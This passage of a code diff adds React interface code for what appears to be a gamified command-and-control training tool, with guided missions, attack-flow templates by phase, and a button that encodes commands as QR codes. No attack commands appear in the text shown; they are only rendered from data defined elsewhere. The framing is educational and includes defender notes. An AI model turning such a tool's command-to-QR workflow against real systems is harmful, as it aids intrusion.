+                              mission.difficulty === 'intermediate' ? 'bg-yellow-950 text-yellow-400' :
+                              mission.difficulty === 'advanced' ? 'bg-red-950 text-red-400' :
+                              'bg-purple-950 text-purple-400'
+                            }`}>
+                              {mission.difficulty}
+                            </span>
+                            <span className="text-[10px] px-1.5 py-0.5 rounded bg-amber-950/50 text-amber-500 border border-amber-900/30">
+                              +{mission.xpReward} XP
+                            </span>
+                            {completed && (
+                              <CheckCircle className="w-4 h-4 text-teal-500 ml-auto" />
+                            )}
+                          </div>
+                          <p className="text-xs text-stone-400">{mission.description}</p>
+                          <div className="flex flex-wrap gap-1 mt-2">
+                            {mission.campaignTags.map(tag => (
+                              <span key={tag} className="text-[9px] px-1.5 py-0.5 rounded bg-stone-900 text-stone-500 border border-stone-800">
+                                {tag}
+                              </span>
+                            ))}
+                          </div>
+                        </div>
+                      );
+                    })}
+                  </div>
+                ) : (
+                  (() => {
+                    const mission = C2_GUIDED_MISSIONS.find(m => m.id === activeMission);
+                    if (!mission) return null;
+                    const step = mission.steps[missionStep];
+                    const isLastStep = missionStep === mission.steps.length - 1;
+                    const completed = missionCompleted.has(mission.id);
+
+                    return (
+                      <div className="space-y-3">
+                        <div className="flex items-center gap-2 flex-wrap">
+                          <Button
+                            variant="ghost"
+                            size="sm"
+                            onClick={() => { setActiveMission(null); setMissionStep(0); }}
+                            className="text-stone-400 hover:text-amber-400 min-h-[44px]"
+                            data-testid="mission-back"
+                          >
+                            Back
+                          </Button>
+                          <span className="text-lg">{mission.icon}</span>
+                          <span className="text-sm text-amber-400 font-bold">{mission.name}</span>
+                          <span className={`text-[10px] px-1.5 py-0.5 rounded ${
+                            mission.difficulty === 'beginner' ? 'bg-green-950 text-green-400' :
+                            mission.difficulty === 'intermediate' ? 'bg-yellow-950 text-yellow-400' :
+                            mission.difficulty === 'advanced' ? 'bg-red-950 text-red-400' :
+                            'bg-purple-950 text-purple-400'
+                          }`}>
+                            {mission.difficulty}
+                          </span>
+                        </div>
+
+                        <div className="p-3 bg-amber-950/20 rounded border border-amber-900/30">
+                          <p className="text-xs text-amber-600 font-bold mb-1">MISSION BRIEFING</p>
+                          <p className="text-xs text-stone-300">{mission.briefing}</p>
+                          <div className="mt-2">
+                            <p className="text-[10px] text-amber-700 font-bold mb-1">OBJECTIVES:</p>
+                            <ul className="text-xs text-stone-400 space-y-0.5">
+                              {mission.objectives.map((obj, i) => (
+                                <li key={i} className="flex gap-2">
+                                  <span className={`${i <= missionStep ? 'text-teal-500' : 'text-stone-600'}`}>
+                                    {i <= missionStep ? '✓' : '○'}
+                                  </span>
+                                  <span className={i <= missionStep ? 'text-teal-400' : ''}>{obj}</span>
+                                </li>
+                              ))}
+                            </ul>
+                          </div>
+                        </div>
+
+                        <div className="flex gap-1 overflow-x-auto no-scrollbar pb-1">
+                          {mission.steps.map((_, i) => (
+                            <Button
+                              key={i}
+                              variant={i === missionStep ? 'default' : 'ghost'}
+                              size="sm"
+                              onClick={() => setMissionStep(i)}
+                              className={`shrink-0 min-h-[36px] min-w-[36px] ${
+                                i === missionStep ? 'bg-amber-700 text-white' :
+                                i < missionStep ? 'text-teal-400 bg-teal-950/30' :
+                                'text-stone-500'
+                              }`}
+                            >
+                              {i + 1}
+                            </Button>
+                          ))}
+                        </div>
+
+                        {step && (
+                          <div className="space-y-3">
+                            <div className="p-3 bg-black/50 rounded border border-amber-900/20">
+                              <p className="text-xs text-amber-500 font-bold mb-2">
+                                Step {missionStep + 1} of {mission.steps.length}
+                              </p>
+                              <p className="text-xs text-stone-300 mb-3">{step.instruction}</p>
+
+                              <div className="p-2 bg-black/50 rounded border border-red-900/20 mb-2">
+                                <p className="text-[10px] text-red-700 font-bold mb-1">COMMAND:</p>
+                                <code className="text-xs text-red-400 break-all">{step.command}</code>
+                              </div>
+
+                              <div className="p-2 bg-black/50 rounded border border-teal-900/20 mb-2">
+                                <p className="text-[10px] text-teal-700 font-bold mb-1">EXPECTED OUTPUT:</p>
+                                <pre className="text-xs text-teal-400/80 whitespace-pre-wrap">{step.expectedOutput}</pre>
+                              </div>
+
+                              <div className="p-2 bg-amber-950/20 rounded border border-amber-900/20">
+                                <p className="text-[10px] text-amber-600 font-bold mb-1">WHY THIS MATTERS:</p>
+                                <p className="text-xs text-stone-300">{step.teaching}</p>
+                              </div>
+                            </div>
+
+                            <div className="flex gap-2 flex-wrap">
+                              <Button
+                                onClick={() => {
+                                  startMissionStep(mission.id, missionStep);
+                                  setC2Section('encode');
+                                }}
+                                className="flex-1 bg-red-700 hover:bg-red-600 text-white font-bold min-h-[44px]"
+                                data-testid="mission-try-command"
+                              >
+                                <Terminal className="w-4 h-4 mr-2" />
+                                Try in Encoder
+                              </Button>
+                              <Button
+                                onClick={async () => {
+                                  try {
+                                    const response = await fetch('/api/qr/secret', {
+                                      method: 'POST',
+                                      headers: { 'Content-Type': 'application/json' },
+                                      body: JSON.stringify({
+                                        secretId: `mission-${mission.id}-step-${missionStep}`,
+                                        hint: step.command
+                                      })
+                                    });
+                                    const data = await response.json();
+                                    setMissionQR(data.qrCode);
+                                  } catch (e) {
+                                    console.error('QR gen error:', e);
+                                  }
+                                }}
+                                variant="outline"
+                                className="border-amber-800 text-amber-600 min-h-[44px]"
+                                data-testid="mission-encode-qr"
+                              >
+                                <QrCode className="w-4 h-4 mr-2" /> Encode QR
+                              </Button>
+                            </div>
+
+                            {missionQR && (
+                              <div className="flex flex-col items-center gap-2 p-3 bg-black/30 rounded border border-amber-900/20" data-testid="mission-qr-display">
+                                <img src={missionQR} alt="Mission Step QR" className="w-28 h-28" data-testid="mission-qr-image" />
+                                <p className="text-[10px] text-stone-500">Step {missionStep + 1} encoded as QR</p>
+                              </div>
+                            )}
+
+                            <div className="flex gap-2 flex-wrap">
+                              {missionStep > 0 && (
+                                <Button
+                                  variant="ghost"
+                                  onClick={() => setMissionStep(prev => prev - 1)}
+                                  className="text-stone-400 min-h-[44px]"
+                                  data-testid="mission-prev-step"
+                                >
+                                  Previous
+                                </Button>
+                              )}
+                              {!isLastStep ? (
+                                <Button
+                                  onClick={() => setMissionStep(prev => prev + 1)}
+                                  className="flex-1 bg-amber-700 hover:bg-amber-600 text-black font-bold min-h-[44px]"
+                                  data-testid="mission-next-step"
+                                >
+                                  Next Step
+                                </Button>
+                              ) : (
+                                <Button
+                                  onClick={() => {
+                                    completeMission(mission.id);
+                                    setActiveMission(null);
+                                    setMissionStep(0);
+                                  }}
+                                  disabled={completed}
+                                  className="flex-1 bg-teal-700 hover:bg-teal-600 text-black font-bold min-h-[44px]"
+                                  data-testid="mission-complete"
+                                >
+                                  <CheckCircle className="w-4 h-4 mr-2" />
+                                  {completed ? 'Already Completed' : `Complete Mission (+${mission.xpReward} XP)`}
+                                </Button>
+                              )}
+                            </div>
+                          </div>
+                        )}
+
+                        <div className="space-y-2 mt-2">
+                          <div className="p-3 bg-red-950/20 rounded border border-red-900/20">
+                            <p className="text-xs text-red-400 font-bold mb-1">REAL-WORLD CASE:</p>
+                            <p className="text-xs text-stone-300">{mission.realWorldCase}</p>
+                          </div>
+                          <div className="p-3 bg-blue-950/20 rounded border border-blue-900/20">
+                            <p className="text-xs text-blue-400 font-bold mb-1">DEFENDER PERSPECTIVE:</p>
+                            <p className="text-xs text-stone-300">{mission.defenderPerspective}</p>
+                          </div>
+                        </div>
+                      </div>
+                    );
+                  })()
+                )}
+
+                {!activeMission && (
+                  <div className="p-3 bg-black/30 rounded border border-stone-800">
+                    <p className="text-xs text-amber-600 font-bold mb-2">ATTACK FLOW TEMPLATES</p>
+                    <p className="text-xs text-stone-500 mb-2">Pre-built multi-step attack sequences. Click to explore each phase.</p>
+                    <div className="grid gap-2">
+                      {ATTACK_FLOW_TEMPLATES.map((flow) => (
+                        <div key={flow.id} className={`rounded border transition-all ${
+                          selectedFlow === flow.id ? 'bg-red-950/30 border-red-700' : 'bg-black/30 border-stone-800 hover:border-red-700/50'
+                        }`} data-testid={`flow-${flow.id}`}>
+                          <div
+                            className="p-2 cursor-pointer flex items-center gap-2"
+                            onClick={() => setSelectedFlow(selectedFlow === flow.id ? null : flow.id)}
+                          >
+                            <span>{flow.icon}</span>
+                            <span className="text-xs text-red-400 font-bold">{flow.name}</span>
+                            <span className={`text-[10px] ml-auto px-1.5 py-0.5 rounded ${
+                              flow.phase === 'recon' ? 'bg-blue-950 text-blue-400' :
+                              flow.phase === 'access' ? 'bg-orange-950 text-orange-400' :
+                              flow.phase === 'persist' ? 'bg-purple-950 text-purple-400' :
+                              'bg-red-950 text-red-400'
+                            }`}>
+                              {flow.phase}
+                            </span>
+                          </div>
+                          {selectedFlow === flow.id && (
+                            <div className="px-2 pb-2 space-y-1 border-t border-red-900/20 pt-2">
+                              <p className="text-xs text-stone-400 mb-2">{flow.description}</p>
+                              {flow.commands.map((cmd, i) => (
+                                <div key={i} className="p-1.5 bg-black/50 rounded">
+                                  <p className="text-[10px] text-stone-500">{cmd.desc}</p>
+                                  <code className="text-[11px] text-red-400">{cmd.cmd}</code>
+                                </div>
+                              ))}
+                              <Button
+                                size="sm"
+                                onClick={() => {
+                                  setC2Command(flow.commands[0].cmd);
+                                  setC2Section('encode');
+                                }}
+                                className="w-full bg-red-800 hover:bg-red-700 text-white mt-1 min-h-[44px]"
+                                data-testid={`flow-load-${flow.id}`}
+                              >
+                                <Terminal className="w-3 h-3 mr-1" /> Load into Encoder
+                              </Button>
+                            </div>
+                          )}
+                        </div>
+                      ))}
+                    </div>
+                  </div>
+                )}
+              </div>
             )}
 
             {/* ATTACK VECTORS SECTION */}
